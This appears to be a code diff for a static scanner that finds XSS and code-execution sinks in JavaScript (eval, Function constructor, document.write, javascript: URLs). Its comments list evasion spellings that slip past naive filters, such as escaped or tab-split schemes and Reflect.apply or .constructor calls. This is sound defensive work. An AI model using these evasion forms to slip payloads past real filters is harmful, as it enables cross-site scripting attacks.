+    const read = analyser(root, project, source, batch);
+    const byName = new Map(specs.map((spec) => [spec.name, spec]));
+    const found = new Map<string, SinkFinding>();
+
+    for (const node of walk(root)) {
+      const tagged = node.kind === SyntaxKind.TaggedTemplateExpression;
+      if (
+        node.kind !== SyntaxKind.CallExpression &&
+        node.kind !== SyntaxKind.NewExpression &&
+        !tagged
+      ) {
+        continue;
+      }
+      // `` eval`code` `` invokes its TAG, and the template is the argument.
+      const callee = tagged ? node.tag : node.expression;
+      if (callee === undefined) continue;
+      // A dynamic `import(…)` has the KEYWORD as its callee; every other sink is
+      // reached through an expression.
+      const viaImport = callee.kind === SyntaxKind.ImportKeyword;
+      // `Reflect.apply(eval, null, ['x'])` runs the sink HERE, rather than
+      // producing something that is invoked later.
+      const reflected = viaImport ? undefined : read.reflectTarget(node);
+      const names = viaImport
+        ? ['import']
+        : reflected === undefined
+          ? read.sinkNames(callee)
+          : read.sinkNames(reflected);
+      // The callee may be a SELECTION, so several names are possible and only
+      // this caller knows which of them are sinks.
+      const spec = names.map((name) => byName.get(name)).find((each) => each !== undefined);
+      if (spec === undefined) continue;
+      if (spec.codeArgument !== undefined) {
+        const position = viaImport
+          ? { index: 0, inArray: false }
+          : reflected !== undefined
+            ? read.reflectPosition(node)
+            : tagged
+              ? { index: 0, inArray: false }
+              : read.codePosition(callee);
+        const args = read.codeArguments(node, position, spec.variadic === true);
+        // Each argument is judged over everything it could BE, not over the
+        // syntax written at the call: `setTimeout(code, 0)` compiles a string
+        // when `code` holds one.
+        if (!args.some((arg) => spec.codeArgument?.(read.codeValues(arg)) === true)) continue;
+      }
+      const entry = read.finding(node, spec.label);
+      found.set(`${entry.line}:${entry.label}:${entry.text}`, entry);
+    }
+    return [...found.values()].sort((a, b) => a.line - b.line || a.label.localeCompare(b.label));
+  }
+}
+
+/**
+ * A `javascript:` URL — string CONTENT that executes when navigated to.
+ *
+ * Read from the COOKED value of a string, not from a pattern over the source.
+ * The pattern this replaces required the quote immediately before the scheme,
+ * so it saw `'javascript:alert(1)'` and missed every equivalent spelling: a
+ * leading space (`' javascript:…'` — the URL parser trims it), an escape
+ * (`'\x6aavascript:…'`), and a tab inside the scheme (`'java\tscript:…'`,
+ * which HTML attribute parsing strips).  All three navigate.
+ */
+function isJavascriptUrl(value: string): boolean {
+  const stripped = [...value].filter((c) => c !== '\t' && c !== '\n' && c !== '\r').join('');
+  let from = 0;
+  while (from < stripped.length && (stripped.codePointAt(from) ?? 0x21) <= 0x20) from += 1;
+  return /^javascript:/i.test(stripped.slice(from));
+}
+
+/** Every `javascript:` URL literal in each source. */
+export function findJavascriptUrlsIn(sources: readonly Source[]): Map<string, SinkFinding[]> {
+  return withParsedSources(sources, (parsed, project) => {
+    const byPath = new Map<string, SinkFinding[]>();
+    for (const { path, content, root } of parsed) {
+      const here = String(root.path);
+      /**
+       * What a NAME holds, for folding a scheme.
+       *
+       * The narrow question this scan asks — `const scheme = 'javascript';
+       * scheme + ':alert(1)'` navigates as the literal does — answered by
+       * following the binding, memoised.
+       *
+       * NOT the value relation.  Asking the general machine here built a
+       * call-site map this scan never consults and ran a whole-program search
+       * for every identifier in every string concatenation in the repository,
+       * which took the scan from milliseconds to never finishing.  The general
+       * relation is for the general question; this one has one hop and a name.
+       */
+      const boundTo = new Map<number, readonly Syntax[]>();
+      const held = (name: Syntax): readonly Syntax[] => {
+        const at = name.getStart();
+        const cached = boundTo.get(at);
+        if (cached !== undefined) return cached;
+        boundTo.set(at, []); // cycle guard while this one resolves
+        const declaration = project.checker
+          .getSymbolAtPosition(here, at)
+          ?.declarations.find((each) => String(each.path) === here)
+          ?.resolve(project) as unknown as Syntax | undefined;
+        const initializer =
+          declaration?.kind === SyntaxKind.VariableDeclaration
+            ? declaration.initializer
+            : undefined;
+        const found = initializer === undefined ? [] : [initializer];
+        boundTo.set(at, found);
+        return found;
+      };
+      const newlines = newlineIndex(content);
+      const found: SinkFinding[] = [];
+      const seen = new Set<number>();
+      for (const node of walk(root)) {
+        // The SCHEME is the static part, so an interpolated template counts:
+        // `\`javascript:${payload}\`` navigates exactly as the literal does, and
+        // so does `'java' + 'script:x'`.  `staticPrefix` folds all three.
+        if (
+          node.kind !== SyntaxKind.StringLiteral &&
+          node.kind !== SyntaxKind.NoSubstitutionTemplateLiteral &&
+          node.kind !== SyntaxKind.TemplateExpression &&
+          !(
+            node.kind === SyntaxKind.BinaryExpression &&
+            node.operatorToken?.kind === SyntaxKind.PlusToken
+          )
+        ) {
+          continue;
+        }
+        const prefix = staticPrefix(node, 0, held);
+        if (prefix === null || !isJavascriptUrl(prefix)) continue;
+        const line = lineAt(newlines, node.getStart());
+        // A folded concatenation and the literal inside it are one URL.
+        if (seen.has(line)) continue;
+        seen.add(line);
+        found.push({
+          label: 'javascript: URL (XSS vector)',
+          line,
+          text: content.slice(node.getStart(), node.getEnd()).slice(0, 200),
+        });
+      }
+      byPath.set(path, found);
+    }
+    return byPath;
+  });
+}
+
+/** Find member-named DOM sink uses across many sources, in ONE project. */
+export function findMemberSinkUsesIn(
+  sources: readonly Source[],
+  specs: readonly MemberSinkSpec[],
+): Map<string, SinkFinding[]> {
+  return withParsedSources(sources, (parsed, project) => {
+    const byPath = new Map<string, SinkFinding[]>();
+    const batch = new Set(parsed.map((each) => String(each.root.path)));
+    for (const { path, content, root } of parsed) {
+      byPath.set(path, memberUsesIn(root, project, content, specs, batch));
+    }
+    return byPath;
+  });
+}
+
+/** Find uses of member-named DOM sinks, in every access spelling. */
+export function findMemberSinkUses(
+  source: string,
+  specs: readonly MemberSinkSpec[],
+): SinkFinding[] {
+  return findMemberSinkUsesIn([{ path: 'scan.ts', content: source }], specs).get('scan.ts') ?? [];
+}
+
+function memberUsesIn(
+  root: Syntax,
+  project: Project,
+  source: string,
+  specs: readonly MemberSinkSpec[],
+  batch: ReadonlySet<string>,
+): SinkFinding[] {
+  {
+    const read = analyser(root, project, source, batch);
+    const found = new Map<string, SinkFinding>();
+    const callSpecs = specs.filter((spec) => spec.form === 'call');
+    const assignSpecs = specs.filter((spec) => spec.form !== 'call');
+
+    const report = (access: Syntax, spec: MemberSinkSpec, on?: Syntax): void => {
+      if (spec.receiver !== undefined) {
+        // The receiver is resolved, not spelled: `const doc = document;
+        // doc.write(p)` reaches the same absolutely-forbidden method, and
+        // comparing identifier TEXT saw only the literal name.
+        const base = on ?? access.expression;
+        if (base === undefined || !read.sinkNames(base).includes(spec.receiver)) return;
+      }
+      const entry = read.finding(access, spec.label);
+      found.set(`${entry.line}:${entry.label}`, entry);
+    };
+
+    for (const node of walk(root)) {
+      // CALLING one.  Asked of the CALLEE'S VALUE rather than of the syntax at
+      // the call, which is the whole difference: `document.write(p)` and
+      // `const write = document.write; write(p)` invoke the same method, and a
+      // scan keyed on "a property access whose parent is a call" saw only the
+      // first.  The wrapper spellings — `document.write.call(…)`,
+      // `Reflect.apply(document.write, …)` — need no case of their own either,
+      // since the relation already resolves both to the same member value.
+      if (
+        node.kind === SyntaxKind.CallExpression ||
+        node.kind === SyntaxKind.NewExpression ||
+        node.kind === SyntaxKind.TaggedTemplateExpression
+      ) {
+        // `` document.write`<b>${p}</b>` `` invokes the method exactly as the
+        // parenthesised call does — the tag is where the callee sits.
+        // A call may also WRITE a property, through the reflective setters.
+        if (node.kind !== SyntaxKind.TaggedTemplateExpression) {
+          for (const write of read.reflectiveWrites(node)) {
+            for (const spec of assignSpecs) {
+              if (spec.property === write.property) report(write.at, spec, write.on);
             }
           }
         }
+        const invoked =
+          node.kind === SyntaxKind.TaggedTemplateExpression
+            ? node.tag
+            : (read.reflectTarget(node) ?? node.expression);
+        for (const member of read.memberSinks(invoked)) {
+          for (const spec of callSpecs) {
+            if (spec.property === member.property) report(member.access, spec);
+          }
+        }
+        continue;
       }
-      continue;
-    }
 
-    // A receiver LITERAL indexed IN PLACE, with no name in between:
-    // `[eval][0]('x')` and `({ run: eval }).run('x')` reach the same sinks the
-    // named forms do. `unwrapReference` finds the literal inside any
-    // parentheses; the member is read after the OUTERMOST group so both
-    // spellings land on the same lookup.
-    if (isPunct(t, '(') || isPunct(t, '[') || isPunct(t, '{')) {
-      const outerEnd = matchGroup(tokens, i);
-      const literal = unwrapReference(tokens, i);
-      const table =
-        outerEnd === -1
-          ? null
-          : literalReceiverTable(tokens, literal, (index) => readReference(index)?.spec ?? null);
-      const reached = table ? descendReceiver(tokens, table, outerEnd) : null;
-      if (reached) walkInvocation(reached.spec, i, reached.next);
+      // WRITING one.  An assignment TARGET is a location, not a value, so it
+      // cannot be aliased into a local the way a method can — reading the
+      // syntax here is not a shortcut, it is what the property is.
+      if (
+        node.kind !== SyntaxKind.PropertyAccessExpression &&
+        node.kind !== SyntaxKind.ElementAccessExpression
+      ) {
+        continue;
+      }
+      const name = read.propertyName(node);
+      if (name === undefined) continue;
+      const parent = node.parent;
+      // Every operator that writes the property, `=` through `??=`.
+      const assigned =
+        parent?.kind === SyntaxKind.BinaryExpression &&
+        WRITING_ASSIGNMENTS.has(parent.operatorToken?.kind ?? -1) &&
+        parent.left?.getStart() === node.getStart();
+      if (!assigned) continue;
+      for (const spec of assignSpecs) {
+        if (spec.property === name) report(node, spec);
+      }
     }
-
-    // `<receiver>.constructor(…)` — EVERY function's `.constructor` is the
-    // `Function` constructor, so this call compiles source no matter what the
-    // receiver is: `(()=>{}).constructor('return 42')()`,
-    // `function f(){}; f.constructor(…)`, `[].map.constructor(…)`,
-    // `({}).toString.constructor(…)` all build the same object.
-    //
-    // Which receivers are functions is NOT statically decidable — the set is
-    // every function literal, every declared function, every built-in method,
-    // every value flowing in from elsewhere — so gating on a recognised
-    // receiver is the enumerate-the-spellings mistake this module exists to
-    // end. An INVOKED `.constructor` is therefore the sink unconditionally.
-    //
-    // Reached only through a MEMBER ACCESS (`.constructor`, `?.constructor`,
-    // `['constructor']`) on something that ends an expression, so a class's
-    // `constructor(){}` method definition — a bare name — never matches. A
-    // `.constructor` that is merely READ (`x.constructor === Foo`,
-    // `x.constructor.name`) is not a call and is not recorded.
-    if (functionSpec && endsExpression(tokens[i - 1])) {
-      const ctor = readMember(tokens, i);
-      if (ctor?.name === 'constructor') walkInvocation(functionSpec, i, ctor.next);
-    }
-
-    const reference = readReference(i);
-    if (!reference) continue;
-
-    // A parenthesized reference — `(eval)('x')`, `(0, Function)('x')` — is the
-    // same reference with the group's `)` in between, so skip it and continue.
-    let after = reference.next;
-    const prev = tokens[i - 1];
-    if ((isPunct(prev, '(') || isPunct(prev, ',')) && isPunct(tokens[after], ')')) {
-      after += 1;
-    }
-    walkInvocation(reference.spec, i, after);
+    return [...found.values()].sort((a, b) => a.line - b.line || a.label.localeCompare(b.label));
   }
-  return out;
-}
-
-/** Resolve a sink reference written as a standalone expression (an argument). */
-function findReferenceIn(
-  argument: readonly Token[],
-  start: number,
-  specByName: ReadonlyMap<string, SinkSpec>,
-  aliases: AliasTable,
-): SinkSpec | null {
-  const first = argument[start];
-  if (first?.kind !== 'ident') return null;
-  const table = GLOBAL_RECEIVERS.has(first.value)
-    ? globalReceiverTable(specByName)
-    : aliases.members.get(first.value);
-  if (table) return descendReceiver(argument, table, start + 1)?.spec ?? null;
-  return specByName.get(first.value) ?? aliases.direct.get(first.value) ?? null;
 }
